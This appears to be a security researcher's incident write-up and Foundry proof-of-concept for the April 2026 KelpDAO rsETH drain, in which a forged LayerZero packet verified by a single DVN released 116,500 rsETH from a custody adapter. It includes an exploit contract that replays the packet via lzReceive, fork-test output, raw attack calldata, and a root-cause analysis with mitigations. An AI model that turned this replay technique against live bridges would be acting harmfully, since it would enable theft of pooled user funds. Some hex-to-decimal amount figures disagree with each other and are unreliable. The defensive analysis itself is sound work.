# KelpDAO-294m-PoC

# KelpDAO `rsETH` — Cross-Chain OFT Drain via Single-DVN Verification Failure

> **Incident date:** 2026-04-19
> **Target:** Kelp `rsETH` OFT adapter on Ethereum (`0x85d4…8Ef3`)
> **Route:** Unichain (EID `30320`) → Ethereum (EID `30101`)
> **Loss on replayed packet:** **116,500 rsETH** (nonce 308)
> **Second verified packet (blocked):** 40,000 rsETH (nonce 309)
> **Root cause class:** verification-path failure on a **1-of-1 DVN** LayerZero V2 route

---

## 1. TL;DR

An attacker obtained the signature of the single required DVN for the Kelp Unichain → Ethereum `rsETH` path and used it to commit a **forged LayerZero packet** on the Ethereum destination endpoint. The packet instructed the Kelp OFT adapter to release **116,500 rsETH** to an attacker-controlled address.

No transaction was ever sent on Unichain. The source outbound nonce never advanced past `307`, `totalSupply` on Unichain was unchanged, and there were no `Transfer` events on the source token during the attack window — yet the destination endpoint accepted the message as `nonce=308` and executed delivery. The destination adapter released real user deposits from its custody balance.

A second forged packet (`nonce=309`, 40,000 rsETH) was committed to the same destination endpoint and remained claimable until the token/adapter blacklisted the recipient with `TransfersBlocked(...)` shortly after the first drain.

The fundamental enabling misconfiguration is a **single DVN required with no optional DVN threshold** on both directions of the path. A compromise or bug in that lone verifier is catastrophic by design.

---

## 2. Primary artifacts

| Artifact | Value |
|---|---|
| Ethereum attack tx | [`0x1ae232da…db4222`](https://etherscan.io/tx/0x1ae232da212c45f35c1525f851e4c41d529bf18af862d9ce9fd40bf709db4222) |
| Attack block | `24,908,285` (pre-state captured at `24,908,284`) |
| GUID (nonce 308) | `0x3f4510d855cf3a805fec59daafae640d290749b7bf1e5450f91b5fb0018b3b4e` |
| GUID (nonce 309) | `0x19073f141ef29ea2eb2c52046e60942a928b2106651e622b73c68e27c969cfe6` |
| Raw message (n=308) | `0x0000…8b1b6c9a6db1304000412dd21ae6a70a82d60d3b` ‖ `0x0000001b1ff0ed00` |
| `amountSD` (6 dec) | `0x1b1ff0ed00` = `116,500,000,000,000` → **116,500 rsETH** in 18 dec |

---

## 3. Architectural background

### 3.1 LayerZero V2 OFT path

LayerZero V2 splits cross-chain messaging into three agents:

1. **OApp / OFT** on each chain (source burns or locks tokens, destination mints or releases).
2. **DVN(s)** — Decentralized Verifier Networks. Each configured DVN independently signs the payload hash observed on the source chain and commits it to the destination receive library.
3. **Executor** — a permissionless actor that pays gas to call `EndpointV2.lzReceive` on the destination once a packet's hash has been committed.

The security model is quorum-based: delivery requires

```
requiredDVNCount signatures + optionalDVNCount ≥ optionalDVNThreshold
```

The OApp owner — not LayerZero — chooses which DVNs are trusted and how many.

### 3.2 Lock-and-release on the Ethereum side

The Kelp OFT **Adapter** on Ethereum (`0x85d4…8Ef3`) is not a mint/burn OFT: it is a **lock-and-release adapter** wrapped around the existing `rsETH` ERC20. When a user bridges `Ethereum → Unichain`, their `rsETH` is transferred into the adapter and a message instructs Unichain to mint. On the return leg (`Unichain → Ethereum`), the adapter releases `rsETH` from its locked inventory.

This makes the adapter a **pooled custody contract** for all Ethereum-side Kelp users who have ever bridged out. A single fraudulent release drains from this shared pool, not from the attacker.

### 3.3 Ethereum endpoint authorization model

`EndpointV2.lzReceive(Origin, receiver, guid, message, extraData)` has **no executor authorization**. Any EOA may call it. The only gate is:

```solidity
require(
    _inboundPayloadHash[receiver][srcEid][sender][nonce]
        == keccak256(abi.encodePacked(guid, message))
);
```

The payload hash is set earlier by the DVN via `ReceiveUln.commitVerification` when quorum is reached. **Once the hash is committed, execution is effectively unconditional.**

---

## 4. Configuration finding: 1-of-1 DVN on both ends

On-chain `getConfig(configType=2)` reads for the exact Kelp OApp path returned:

### Source side (Unichain)

- `sendLibrary` = `0xC39161c743D0307EB9BCc9FEF03eeb9Dc4802de7`
- `confirmations = 42`
- `requiredDVNCount = 1`
- `optionalDVNCount = 0`
- `optionalDVNThreshold = 0`
- `requiredDVNs = [0x282b3386571f7f794450d5789911a9804fa346b4]`

### Destination side (Ethereum)

- `receiveLibrary` = `0xc02Ab410f0734EFa3F14628780e6e695156024C2`
- `confirmations = 42`
- `requiredDVNCount = 1`
- `optionalDVNCount = 0`
- `optionalDVNThreshold = 0`
- `requiredDVNs = [0x589dedbd617e0cbcb916a9223f4d1300c294236b]`

The route is therefore **effectively 1-of-1**. A single verifier failure — key compromise, signing bug, misconfigured source chain RPC feeding the DVN, or any equivalent — is sufficient to fabricate arbitrary packets on this route.

---

## 5. Evidence that the 116,500 rsETH release was not backed by a source-side send

### 5.1 Nonce discontinuity

| Endpoint query | Value |
|---|---|
| `Endpoint(Eth).lazyInboundNonce(adapter, 30320, srcSender)` (post-attack) | `308` |
| `Endpoint(Uni).outboundNonce(srcToken, 30101, adapter)` | **`307`** |

A legitimate send would advance the source outbound nonce to `≥ 308`. It did not.

### 5.2 Source-chain supply and log check

Unichain `rsETH.totalSupply()`:

| Block | totalSupply |
|---|---|
| `45,785,275` | `49.259532 rsETH` |
| `45,785,276` (LZ Scan creation block for nonce 308) | `49.259532 rsETH` |
| `45,785,277` | `49.259532 rsETH` |
| `45,786,000` | `49.259532 rsETH` |

No change during the attack window, and the total supply (~49 rsETH) is smaller than the claimed bridge amount by a factor of ~2,300× — a legitimate burn/lock of 116,500 rsETH on Unichain is physically impossible.

`eth_getLogs` for the source token over the relevant block window returned **zero** `Transfer` events and **zero** burns to `0x0`.

### 5.3 Control case: nonce 307

The previous nonce on this exact path is a clean control. Its source tx on Unichain (`0x32877156…7d778`) emits the canonical OFT debit-and-burn pattern:

```
Transfer(user → adapter,  0.006 rsETH)
Transfer(adapter → 0x0,   0.006 rsETH)
```

and its `amountSD = 0x1770 = 6000` matches the Ethereum-side release of exactly `0.006 rsETH`. The infrastructure clearly works as designed when a real user initiates a send — the nonce-308 packet did not come from that path.

---

## 6. Attack transaction decomposition

Ethereum tx `0x1ae232da…db4222` (block `24,908,285`) is a **single call** to `EndpointV2.lzReceive`. Decoded call tree:

```
EndpointV2.lzReceive(
    Origin{ srcEid: 30320, sender: 0x…c3eacf…9f58, nonce: 308 },
    receiver = 0x85d4…8Ef3              // Kelp OFT adapter
    guid     = 0x3f4510…3b4e,
    message  = 0x0000…8b1b…0D3b ‖ 0x0000001b1ff0ed00,
    extraData = 0x
)
└── KelpOFTAdapter.lzReceive(...)
    ├── rsETH.transfer(0x8B1b…0D3b, 116_500e18)
    │     └── delegatecall → rsETH impl
    │          emit Transfer(adapter → recipient, 116_500e18)
    └── emit OFTReceived(guid, recipient, amountSD=0x7670, amountLD=0x18ab7a47948bcfd00000)
```

### Payload decoding

The OFT message layout is `bytes32 recipient || uint64 amountSD`:

- `recipient` = `0x8B1b6c9A6DB1304000412dd21Ae6A70a82d60D3b`
- `amountSD` = `0x1b1ff0ed00 = 116,500,000,000,000` in shared decimals (6)
- `amountLD = amountSD × 10^(18 − 6) = 116,500 × 10^18`

The endpoint's `_clearPayload` confirms `keccak256(guid ‖ message) == inboundPayloadHash`, zeroes the hash slot, then invokes the adapter.

Gas used by the whole attack tx: **94,456**.

---

## 7. The exploit path, step by step

1. **DVN signs a fabricated packet.** The unique required DVN commits a payload hash for `(srcEid=30320, sender=Unichain-OFT, nonce=308, guid=0x3f45…, message=<recipient ‖ amountSD>)`. No corresponding send ever occurred on Unichain.
2. **`ReceiveUln.commitVerification`** writes the hash to `EndpointV2._inboundPayloadHash[adapter][30320][srcSender][308]`.
3. **Attacker (or any EOA) calls `lzReceive`.** The endpoint's only check is hash equality, which passes.
4. **Adapter's `lzReceive`** decodes the OFT message and calls `rsETH.transfer(recipient, 116_500e18)` from its own custody balance.
5. **116,500 rsETH move out** of the shared custody pool into the attacker address.
6. **`_clearPayload` zeroes the hash** and bumps `lazyInboundNonce` to `308`, further masking the anomaly from naive monitors.

There is no reentrancy, no integer bug, no reentrant signature replay, no MEV leverage — it is a pure **verification-path trust failure**.

---

## 8. The second packet (nonce 309): corroboration

The same DVN committed a second packet (`guid=0x19073f…9cfe6`, `amountSD=40,000,000,000` → 40,000 rsETH). On Ethereum:

```
Endpoint.inboundPayloadHash(adapter, 30320, srcSender, 309)
  = 0xbf86af6f10782715c263b7c76c86e7a965b29f2a0119806ea4eb108d197e0c7e
```

Two executor attempts to deliver it failed:

- `0x8509533a…83e53` — revert
- `0x48d9b3e8…65d792` — revert

`eth_call` replay of the first failed attempt reverts with:

```
TransfersBlocked(0x8B1b6c9A6DB1304000412dd21Ae6A70a82d60D3b, 2026-04-19 18:23:11 UTC)
```

Adapter inventory at those blocks was ~40,357 rsETH — enough to cover 40,000. **The failure was not inventory-related.** Kelp had flipped a blacklist/pause affecting that recipient after observing the first drain. The fact that the packet was verified and that its delivery could only be stopped by an app-level blacklist — not by the endpoint or the DVN — confirms the verification path itself was the compromised layer.

---

## 9. Root cause analysis

The proximate, evidence-supported cause is **single-DVN verification failure**. The class of failure fits any of:

1. **DVN key compromise.** A leaked/stolen signer key would let an attacker produce valid signatures for arbitrary `(guid, nonce, message)` tuples on this route.
2. **Faulty DVN off-chain pipeline.** A verifier that accepts work items without genuinely reading the source-chain block/log the way the protocol requires (e.g., a broken or spoofed RPC feed).
3. **OApp/DVN mis-binding.** If the source and destination DVN configurations were not coherent, verification semantics break regardless of key custody.

The **root architectural cause** is Kelp's OApp configuration: `1 required DVN + 0 optional DVNs + threshold 0`. LayerZero's documented best practice is "at least two required DVNs, plus an optional-DVN threshold ≥ 1." A 1-of-1 route has no defense-in-depth against any of the three failure modes above.

### Why the lock-and-release adapter amplified the loss

Because the Ethereum side is an adapter over an existing ERC20 (not a mint/burn OFT), the stolen funds are real user deposits. `totalSupply` on Ethereum is **unchanged** — the attack is economically a theft from the shared custody pool, not an inflationary mint. Every user whose `rsETH` sat in the adapter at the attack block is pro-rata exposed until Kelp socializes or recovers.

---

## 10. Proof-of-Concept

This repository reproduces the attack as a Foundry fork test. It demonstrates that, at block `24,908,284` (the block **before** the attack landed), the destination endpoint already held a valid committed payload hash for nonce 308, and any caller could complete the drain by invoking `lzReceive`.

### 10.1 Contract `src/KelpRsETHExploit.sol`

```solidity
contract KelpRsETHExploit {
    ILayerZeroEndpointV2 public constant ENDPOINT =
        ILayerZeroEndpointV2(0x1a44076050125825900e736c501f859c50fE728c);

    address public constant ADAPTER = 0x85d456B2DfF1fd8245387C0BfB64Dfb700e98Ef3;
    bytes32 public constant SRC_SENDER =
        0x000000000000000000000000c3eacf0612346366db554c991d7858716db09f58;
    uint32  public constant SRC_EID = 30320;

    function replay(uint64 nonce, bytes32 guid, bytes calldata message) external {
        ENDPOINT.lzReceive(
            Origin({srcEid: SRC_EID, sender: SRC_SENDER, nonce: nonce}),
            ADAPTER, guid, message, ""
        );
    }
}
```

### 10.2 Test harness

`test/KelpRsETHExploit.t.sol` forks mainnet at the pre-attack block, asserts that the forged packet hash is already stored on the endpoint (DVN has committed), replays the packet, and checks the balance deltas.

### 10.3 Reproduced output

Invocation: `forge test --match-test test_replay_nonce_308 -vvv`

```
================ KELP rsETH EXPLOIT REPLAY ================
Fork block            : 24908284
Token                 : rsETH rsETH

---- pre-attack endpoint state ----
0xf79a27bb975e38a484124e6f31aad957397b6760a15e522241cd4c372663fef4
lazyInboundNonce(308) : 307

---- pre-attack balances (wei) ----
recipient (0x8b1b..)  : 0
adapter   (0x85d4..)  : 116723520635500000000000        # 116,723.52 rsETH
rsETH totalSupply     : 629736447879606340903548

payload hash == keccak256(guid|message) : OK

---- post-attack balances (wei) ----
recipient (0x8b1b..)  : 116500000000000000000000        # 116,500.00 rsETH
adapter   (0x85d4..)  : 223520635500000000000           #     223.52 rsETH
rsETH totalSupply     : 629736447879606340903548        # UNCHANGED

---- deltas ----
stolen to recipient   : 116500000000000000000000 wei
stolen (rsETH whole)  : 116500
drained from adapter  : 116500 rsETH
totalSupply changed?  : false

---- post-attack endpoint state ----
0x0000000000000000000000000000000000000000000000000000000000000000   # cleared
==========================================================

[PASS] test_replay_nonce_308() (gas: 131073)
```

### 10.4 What the PoC proves

1. At block `24,908,284` (one block before the attack), `inboundPayloadHash(adapter, 30320, srcSender, 308)` is **already non-zero** and equal to `keccak256(guid ‖ message)` — i.e., the DVN had already committed the forged packet.
2. `lazyInboundNonce = 307` at that moment, confirming no legitimate nonce 308 packet ever existed.
3. The replay call is executed **from our own test contract** (not the original executor EOA) and still succeeds, demonstrating that `lzReceive` has no executor authorization and that the compromise is complete before any EVM-side defense can fire.
4. Post-replay, `totalSupply` is unchanged and the adapter balance dropped by exactly 116,500 rsETH — consistent with the on-chain event footprint described in `attack_trace.txt`.

---

## 11. Impact

| Dimension | Impact |
|---|---|
| Direct loss | 116,500 rsETH drained from the Ethereum adapter's custody pool (nonce 308). |
| Pending exposure | 40,000 rsETH additional packet (nonce 309) verified and still on the destination endpoint. Blocked by `TransfersBlocked` — recoverable only if Kelp refuses to lift the block. |
| Who absorbs the loss | Pro-rata every depositor whose `rsETH` was locked in the Ethereum adapter at the attack block. |
| Supply effect | `rsETH.totalSupply()` on both chains is unchanged. This is **theft**, not **inflation**. |
| Protocol integrity | Every other Kelp cross-chain path sharing the same DVN configuration is presumptively vulnerable until proven otherwise. |

---

## 12. Mitigations

### Immediate (Kelp, ecosystem)

1. **Pause the affected OApp path** on both chains: set `setSendLibrary` / `setReceiveLibrary` to a zero-quorum blocking configuration, or call adapter-level pause.
2. **Revoke / rotate** the compromised DVN key on every route it secures. Treat every packet that DVN has ever signed alone as suspect until proven against source-chain evidence.
3. **Sweep all destination endpoints** for this OApp to identify any other committed-but-undelivered packet hashes. Any such hash is an uncallable theft primitive waiting to fire.

### Structural (any OApp owner)

1. **Never run a 1-of-1 DVN route.** Minimum safe configuration per LayerZero docs: `requiredDVNCount ≥ 2` with DVNs run by independent operators, plus `optionalDVNCount ≥ 1` with `optionalDVNThreshold ≥ 1`.
2. **Add a destination-side delivery delay** on high-value OApps (custom `lzReceive` gate that only releases funds after N blocks following `commitVerification`). Gives monitoring a window to `skip()`/`nilify()` the packet.
3. **Reconcile nonces across endpoints.** A monitoring job that compares `outboundNonce` on source to `lazyInboundNonce` on destination would have detected the nonce-308 discontinuity immediately.
4. **Cap per-packet release** at the adapter level against current inventory and recent send volume. A single 116,500 rsETH release against a ~49 rsETH source supply is absurd on its face and should not be automatable.
5. **Monitor `PacketVerified` without matching source tx** via LayerZero Scan. A committed packet with no source-side counterpart is a hard alert.

### LayerZero ecosystem

1. Surface a **default-safe OApp configuration** path that refuses to accept routes with `requiredDVNCount < 2` and `optionalDVNThreshold = 0` unless the OApp owner signs an explicit acknowledgement.
2. Ship an out-of-the-box **nonce-reconciliation oracle** as a standard optional DVN so any OApp can turn it on cheaply.

---

## 13. Open questions

- Was the compromised DVN hosting the signer key with HSM-grade protection, or was it a warm/hot key? The failure mode (key compromise vs signing-service bug vs RPC spoof) determines what else the attacker can still reach.
- Did the attacker gain access earlier than the observed attack window? Any historically verified packet on this or adjacent routes should be re-checked against source-chain evidence.
- Why was `0x8B1b6c9A6DB1304000412dd21Ae6A70a82d60D3b` specifically `TransfersBlocked` at `2026-04-19 18:23:11 UTC`? If Kelp's token has an admin blocklist, that capability needs its own threat model.
- Were other Kelp cross-chain paths (e.g., Ethereum↔BNB, Ethereum↔Arbitrum) configured with the same 1-of-1 DVN, and if so, are there any verified-but-undelivered packets on them?

---

## 14. References

- Attack tx: <https://etherscan.io/tx/0x1ae232da212c45f35c1525f851e4c41d529bf18af862d9ce9fd40bf709db4222>
- LayerZero Scan (nonce 308): <https://scan.layerzero-api.com/v1/messages/guid/0x3f4510d855cf3a805fec59daafae640d290749b7bf1e5450f91b5fb0018b3b4e>
- LayerZero Scan (nonce 309): <https://scan.layerzero-api.com/v1/messages/guid/0x19073f141ef29ea2eb2c52046e60942a928b2106651e622b73c68e27c969cfe6>
- LayerZero V2 integration checklist: <https://docs.layerzero.network/v2/tools/integration-checklist>
- LayerZero DVN overview: <https://docs.layerzero.network/v2/workers/off-chain/dvn-overview>
- Control case source tx (nonce 307, Unichain): <https://uniscan.xyz/tx/0x32877156a2d7d186f3a43c8365b1743fb7eff84bd94b8ef2688702ba1447d778>
- Control case destination tx (nonce 307, Ethereum): <https://etherscan.io/tx/0xc232af35a6c98c92fdb0b08675e93d678994c2c97d31e133f909e0cb95960211>

---

## Appendix A. Raw calldata of the attack

```
lzReceive calldata:
  origin.srcEid  = 30320                                              # Unichain
  origin.sender  = 0x000000000000000000000000c3eacf061234...858716db09f58
  origin.nonce   = 308
  receiver       = 0x85d456B2DfF1fd8245387C0BfB64Dfb700e98Ef3          # Kelp adapter
  guid           = 0x3f4510d855cf3a805fec59daafae640d290749b7bf1e5450f91b5fb0018b3b4e
  message        = 0x0000000000000000000000008b1b6c9a6db1304000412dd21ae6a70a82d60d3b
                   ‖ 0x0000001b1ff0ed00
  extraData      = 0x
```

## Appendix B. Reproducibility

```bash
forge test --match-test test_replay_nonce_308 -vvvv \
  --fork-url https://ultra-maximum-research.quiknode.pro/<key> \
  --fork-block-number 24908284
```

Expected: `1 passed`. Deltas: recipient `+116,500 rsETH`, adapter `-116,500 rsETH`, `totalSupply` unchanged.
